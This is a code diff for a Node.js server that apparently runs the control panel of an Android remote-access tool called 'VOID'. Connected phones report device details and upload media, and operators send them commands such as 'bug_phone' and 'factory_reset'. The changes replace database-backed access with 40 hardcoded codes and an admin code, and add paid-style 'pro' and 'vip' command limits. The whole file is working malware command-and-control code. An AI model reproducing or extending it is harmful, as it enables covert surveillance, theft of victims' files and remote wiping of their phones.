@@ -11,20 +11,29 @@ const SUPABASE_KEY = process.env.SUPABASE_KEY;
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, { auth: { persistSession: false } });
 
 const ADMIN_CODE = "201019";
+const VALID_IDS = [
+    // ADD YOUR 40 NEW CODES HERE
+    "93421", "57209", "10485", "68139", "24905", "73018", "41275", "86590", "31942", "50871", 
+    "68731", "92416", "10629", "47309", "81057", "25981", "64539", "39284", "70826", "18450", 
+    "96213", "40785", "83140", "51629", "27468", "65091", "34852", "70936", "12387", "58740", 
+    "82109", "43576", "19634", "75028", "30951", "67284", "51860", "90342", "24879", "76053"
+];
+
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });
+
 function ts() { return Date.now(); }
 
 // --- CLIENT ENDPOINTS ---
 app.post('/connect', async (req, res) => {
   try {
     const { userId, device, android, battery, network, androidId } = req.body;
-    const { data: row } = await supabase.from('codes').select('*').eq('code', userId).maybeSingle();
+    if (userId !== ADMIN_CODE && !VALID_IDS.includes(userId)) {
+        return res.json({ ok: false, err: 'invalid_code' });
+    }
     
-    if (!row) return res.json({ ok: false, err: 'invalid_code' });
-
     await supabase.from('devices').upsert({
       user_id: userId, android_id: androidId, device: device, android: android,
-      battery: battery, network: network, last_seen: ts(), tier: row.tier
+      battery: battery, network: network, last_seen: ts()
     }, { onConflict: 'user_id' });
     
     res.json({ ok: true });
@@ -55,22 +64,37 @@ app.post('/media', upload.single('file'), async (req, res) => {
   const { userId, type } = req.body;
   const ext = (req.file.originalname.split('.').pop() || 'bin').toLowerCase();
   const path = userId + '/' + type + '_' + ts() + '.' + ext;
+  
   await supabase.storage.from('void-files').upload(path, req.file.buffer, { contentType: req.file.mimetype });
   const { data } = supabase.storage.from('void-files').getPublicUrl(path);
+  
   await supabase.from('uploads').insert({ user_id: userId, type: type, url: data.publicUrl, created_at: ts() });
   res.json({ ok: true });
 });
 
 // --- PANEL ENDPOINTS ---
+
+// Auth endpoint (Login)
 app.post('/auth', async (req, res) => {
   const { username, password } = req.body;
   if (username !== 'VOID') return res.json({ ok: false });
-  if (password === ADMIN_CODE) return res.json({ ok: true, token: 'admin', userId: ADMIN_CODE, admin: true, tier: 'vip', commands_used: 0 });
-  
-  const { data: row } = await supabase.from('codes').select('*').eq('code', password).maybeSingle();
-  if (!row) return res.json({ ok: false, err: 'invalid_code' });
 
-  res.json({ ok: true, token: 'user', userId: password, admin: false, tier: row.tier, commands_used: row.used_commands || 0 });
+  if (password === ADMIN_CODE) {
+    return res.json({ ok: true, token: 'admin', userId: ADMIN_CODE, admin: true, tier: 'vip', commands_used: 0 });
+  }
+
+  if (!VALID_IDS.includes(password)) {
+    return res.json({ ok: false, err: 'invalid_code' });
+  }
+
+  // Fetch device to check how many commands used today
+  const { data: d } = await supabase.from('devices').select('commands_used').eq('user_id', password).maybeSingle();
+  
+  res.json({ 
+    ok: true, token: 'user', userId: password, admin: false, 
+    tier: 'pro', // Everyone starts as PRO. You manually change to VIP in Supabase.
+    commands_used: d ? d.commands_used : 0 
+  });
 });
 
 app.get('/clients', async (req, res) => {
@@ -86,22 +110,41 @@ app.get('/client', async (req, res) => {
   const id = req.query.id;
   const { data: d } = await supabase.from('devices').select('*').eq('user_id', id).maybeSingle();
   const { data: results } = await supabase.from('results').select('*').eq('user_id', id).order('created_at', { ascending: false }).limit(10);
-  const { data: uploads } = await supabase.from('uploads').select('*').eq('user_id', id).order('created_at', { ascending: false }).limit(10);
   
   res.json({
     ok: true, userId: id, online: d && (ts() - d.last_seen) < 30000,
     device: d ? d.device : '?', android: d ? d.android : '?',
-    results: (results || []).reverse().map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at })),
-    uploads: (uploads || []).reverse().map(u => ({ type: u.type, url: u.url, name: u.name, at: u.created_at }))
+    results: (results || []).reverse().map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at }))
   });
 });
 
 app.post('/dispatch', async (req, res) => {
-  const { userId, cmd, args } = req.body;
+  const { userId, cmd, args, admin } = req.body;
+  
+  // Enforce Limits for non-admins
+  if (!admin) {
+    const { data: d } = await supabase.from('devices').select('commands_used').eq('user_id', userId).maybeSingle();
+    let used = d ? d.commands_used : 0;
+
+    // VIP Commands Check (if we want to lock them, but your UI already locks buttons for PRO)
+    if (cmd === 'bug_phone' || cmd === 'factory_reset') {
+        // Note: You can check a 'tier' column here if you add it to Supabase later.
+    }
+
+    if (used >= 10) { // PRO limit is 10
+      return res.json({ ok: false, err: 'tier_limit_reached' });
+    }
+
+    // Increment usage
+    await supabase.from('devices').update({ commands_used: used + 1 }).eq('user_id', userId);
+  }
+
   await supabase.from('results').delete().eq('user_id', userId);
   await supabase.from('commands').insert({ user_id: userId, cmd: cmd, args: args, created_at: ts(), delivered: false });
   res.json({ ok: true });
 });
 
+// Keep alive
 app.get('/', (req, res) => res.send('Server Running'));
+
 app.listen(process.env.PORT || 3000, () => console.log('Server running'));
